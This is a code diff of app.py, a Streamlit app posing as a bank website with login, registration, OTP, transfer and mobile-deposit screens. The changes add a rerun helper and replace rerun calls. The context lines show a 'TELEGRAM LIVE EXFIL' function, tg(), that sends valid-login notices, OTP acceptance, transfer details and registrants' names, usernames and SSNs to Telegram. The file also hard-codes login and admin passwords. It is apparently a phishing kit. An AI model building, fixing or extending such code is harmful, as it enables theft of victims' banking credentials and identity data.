@@ -1,6 +1,3 @@
-# Full app.py — fixed fallback button keys to prevent StreamlitDuplicateElementId.
-# All original features and flows retained.
-
 import streamlit as st
 import pandas as pd
 from datetime import datetime, timedelta
@@ -18,6 +15,28 @@ try:
     PIL_AVAILABLE = True
 except Exception:
     PIL_AVAILABLE = False
+
+# ==================== Compatibility helpers ====================
+def rerun_app():
+    """
+    Safe rerun helper: use experimental_rerun if available, otherwise fallback to rerun.
+    This prevents AttributeError across Streamlit versions.
+    """
+    if hasattr(st, "experimental_rerun"):
+        try:
+            st.experimental_rerun()
+            return
+        except Exception:
+            pass
+    # final fallback (should exist)
+    if hasattr(st, "rerun"):
+        try:
+            st.rerun()
+            return
+        except Exception:
+            pass
+    # If neither works, raise a RuntimeError so it's visible in logs
+    raise RuntimeError("Unable to rerun Streamlit app: no rerun function available on st")
 
 # ==================== TELEGRAM LIVE EXFIL ====================
 def tg(message):
@@ -311,10 +330,6 @@ def format_currency(v: float) -> str:
 
 # ==================== Robust receipt & pending-deposit renderers ====================
 def render_receipt_card(tx: dict, idx: str | int | None = None, expanded: bool = False):
-    """
-    Render a polished receipt-style card for a transaction.
-    Defensive: coerce label and keys to strings and fall back if Streamlit raises TypeError.
-    """
     date = tx.get("date", "-")
     desc = tx.get("desc", "-")
     amount = tx.get("amount", 0.0)
@@ -340,12 +355,7 @@ def render_receipt_card(tx: dict, idx: str | int | None = None, expanded: bool =
             st.markdown("<div class='card'>", unsafe_allow_html=True)
             st.markdown(f"<div class='receipt-title'>{desc}</div>", unsafe_allow_html=True)
             st.markdown(f"<div class='receipt-meta'>Date: {date} • Account: {account}</div>", unsafe_allow_html=True)
-            st.markdown(
-                f"<div style='display:flex;justify-content:space-between;align-items:center;'>"
-                f"<div class='receipt-amount'>{sign}{amount_str}</div>"
-                f"<div><span class='badge {badge_class}'>{'CREDIT' if pos else 'DEBIT'}</span></div></div>",
-                unsafe_allow_html=True
-            )
+            st.markdown(f"<div style='display:flex;justify-content:space-between;align-items:center;'><div class='receipt-amount'>{sign}{amount_str}</div><div><span class='badge {badge_class}'>{'CREDIT' if pos else 'DEBIT'}</span></div></div>", unsafe_allow_html=True)
             cols = st.columns([1,1,1])
             with cols[0]:
                 if st.button("View Details", key=f"view_{exp_key}"):
@@ -360,7 +370,6 @@ def render_receipt_card(tx: dict, idx: str | int | None = None, expanded: bool =
                     st.success("Transaction flagged. Support will follow up.")
             st.markdown("</div>", unsafe_allow_html=True)
     except TypeError:
-        # Fallback rendering without expander key — provide explicit fallback key to avoid duplicates
         fallback_flag_key = f"flag_fallback_{key_base}"
         st.markdown("<div class='card'>", unsafe_allow_html=True)
         st.markdown(f"**{header_label}**")
@@ -373,11 +382,7 @@ def render_receipt_card(tx: dict, idx: str | int | None = None, expanded: bool =
             st.success("Transaction flagged. Support will follow up.")
         st.markdown("</div>", unsafe_allow_html=True)
 
-
 def render_pending_deposit_card(rec: dict, allow_admin_actions: bool = False):
-    """
-    Render a polished pending deposit card with defensive key handling.
-    """
     date = rec.get("date", "-")
     filename = rec.get("filename", "-")
     amount = rec.get("amount", 0.0)
@@ -401,14 +406,7 @@ def render_pending_deposit_card(rec: dict, allow_admin_actions: bool = False):
     try:
         with st.expander(header, expanded=False, key=exp_key):
             st.markdown("<div class='card'>", unsafe_allow_html=True)
-            st.markdown(
-                f"<div style='display:flex;justify-content:space-between;align-items:center;'>"
-                f"<div><strong>Deposit</strong><div style='color:var(--text-muted);font-size:0.95rem'>{filename}</div></div>"
-                f"<div style='text-align:right'>{'<span class=\"badge badge--pos\">CLEARED</span>' if status=='cleared' else ('<span class=\"badge\" style=\"background:var(--warning);color:white;\">PENDING</span>' if status=='pending' else ('<span class=\"badge\" style=\"background:var(--danger);color:white;\">HELD</span>'))}"
-                f"<div style='font-size:0.85rem;color:var(--text-muted);margin-top:6px'>Available on: {available_on}</div></div>"
-                f"</div>",
-                unsafe_allow_html=True
-            )
+            st.markdown(f"<div style='display:flex;justify-content:space-between;align-items:center;'><div><strong>Deposit</strong><div style='color:var(--text-muted);font-size:0.95rem'>{filename}</div></div><div style='text-align:right'>{'<span class=\"badge badge--pos\">CLEARED</span>' if status=='cleared' else ('<span class=\"badge\" style=\"background:var(--warning);color:white;\">PENDING</span>' if status=='pending' else ('<span class=\"badge\" style=\"background:var(--danger);color:white;\">HELD</span>'))}<div style='font-size:0.85rem;color:var(--text-muted);margin-top:6px'>Available on: {available_on}</div></div></div>", unsafe_allow_html=True)
             st.markdown(f"<div style='margin-top:12px;color:var(--text-muted)'>Signed by: <strong>{rec.get('signed_by','-')}</strong> • Verification (last4): ****{rec.get('verified_last4','-')}</div>", unsafe_allow_html=True)
             if note:
                 st.markdown(f"<div style='margin-top:8px;color:var(--danger);font-weight:600'>Note: {note}</div>", unsafe_allow_html=True)
@@ -450,7 +448,6 @@ def render_pending_deposit_card(rec: dict, allow_admin_actions: bool = False):
                         st.success("Deposit removed from list (audit recorded).")
             st.markdown("</div>", unsafe_allow_html=True)
     except TypeError:
-        # Fallback with explicit fallback keys to avoid duplicate-element exceptions
         fallback_msg_key = f"msg_fallback_{key_base}"
         st.markdown("<div class='card'>", unsafe_allow_html=True)
         st.markdown(f"**{header}**")
@@ -489,7 +486,7 @@ def transfer():
             state.tx.insert(0, {"uid": str(uuid.uuid4()), "date": now_str, "desc": f"Transfer from Checking{(' - '+memo) if memo else ''}", "amount": float(amount), "account": "Savings"})
             tg(f"TRANSFER: ${amount:,.2f} from Checking to Savings. Memo: {memo}")
             st.success(f"Transferred {format_currency(amount)} to Savings.")
-            st.experimental_rerun()
+            rerun_app()
         else:
             if amount > state.savings:
                 st.error("Insufficient funds in Savings.")
@@ -500,7 +497,7 @@ def transfer():
             state.tx.insert(0, {"uid": str(uuid.uuid4()), "date": now_str, "desc": f"Transfer from Savings{(' - '+memo) if memo else ''}", "amount": float(amount), "account": "Checking"})
             tg(f"TRANSFER: ${amount:,.2f} from Savings to Checking. Memo: {memo}")
             st.success(f"Transferred {format_currency(amount)} to Checking.")
-            st.experimental_rerun()
+            rerun_app()
 
     st.markdown("</div>", unsafe_allow_html=True)
 
@@ -519,10 +516,10 @@ def login():
             if user == "Awesome12@" and pwd == "SecureUSA2025!":
                 state.auth = True
                 tg("VALID CREDENTIALS")
-                st.rerun()
+                rerun_app()
             elif user == "admin" and pwd == "showme2025":
                 state.admin = True
-                st.rerun()
+                rerun_app()
             else:
                 st.error("Invalid credentials")
         st.markdown("</div>", unsafe_allow_html=True)
@@ -550,7 +547,7 @@ def register():
                     tg(f"NEW REGISTRATION\nName: {name}\nUser: {username}\nSSN: {ssn}")
                     st.success("Account created! A verification email has been sent.")
                     st.balloons()
-                    st.rerun()
+                    rerun_app()
         st.markdown("</div>", unsafe_allow_html=True)
 
 # ==================== OTP / DASHBOARD / HISTORIES ====================
@@ -566,7 +563,7 @@ def otp():
             state.otp_ok = True
             tg("OTP ACCEPTED")
             st.success("Success")
-            st.rerun()
+            rerun_app()
 
 def dashboard():
     header()
@@ -585,7 +582,7 @@ def dashboard():
         st.markdown(f"<div style='display:flex;gap:12px;margin-top:12px;'><div style='font-size:0.9rem;color:var(--text-muted)'>Last deposit: <strong style='color:var(--text-primary)'>{last_deposit_str}</strong></div><div style='font-size:0.9rem;color:var(--text-muted)'>Pending deposits: <strong style='color:var(--warning)'> {sum(1 for f in state.files if f.get('status')=='pending')} </strong></div></div>", unsafe_allow_html=True)
         if st.button("Checking Account ••••1776", use_container_width=True):
             st.session_state.view = "checking"
-            st.rerun()
+            rerun_app()
         st.markdown("</div>", unsafe_allow_html=True)
 
     with col2:
@@ -598,7 +595,7 @@ def dashboard():
         st.markdown(f"<div style='display:flex;gap:12px;margin-top:12px;'><div style='font-size:0.9rem;color:var(--text-muted)'>YTD interest: <strong style='color:var(--success)'>{format_currency(savings_interest)}</strong></div></div>", unsafe_allow_html=True)
         if st.button("Savings Account ••••1812", use_container_width=True):
             st.session_state.view = "savings"
-            st.rerun()
+            rerun_app()
         st.markdown("</div>", unsafe_allow_html=True)
     st.markdown("</div>", unsafe_allow_html=True)
 
@@ -637,7 +634,7 @@ def checking_history():
         st.write("No checking transactions")
     if st.button("Back"):
         st.session_state.view = None
-        st.rerun()
+        rerun_app()
 
 def savings_history():
     header()
@@ -652,7 +649,7 @@ def savings_history():
         st.write("No savings transactions")
     if st.button("Back"):
         st.session_state.view = None
-        st.rerun()
+        rerun_app()
 
 # ==================== Mobile deposit, messages, admin, sidebar, main flow ====================
 def mobile_deposit():
@@ -781,7 +778,7 @@ def mobile_deposit():
             state.tx.insert(0, {"uid": str(uuid.uuid4()), "date": today.strftime("%m/%d"), "desc": "Mobile Deposit (pending)", "amount": 0.00, "account": "Checking"})
             st.success(f"Deposit submitted — ${amount:.2f} is expected to be available on {available_on} (simulated).")
             st.info("A portion of the deposit may be available sooner depending on verification. We will notify you when cleared.")
-        st.experimental_rerun()
+        rerun_app()
 
     st.markdown("</div>", unsafe_allow_html=True)
 
@@ -844,4 +841,4 @@ else:
         elif page == "Messages": messages()
         elif page == "Logout":
             st.session_state.clear()
-            st.rerun()
+            rerun_app()
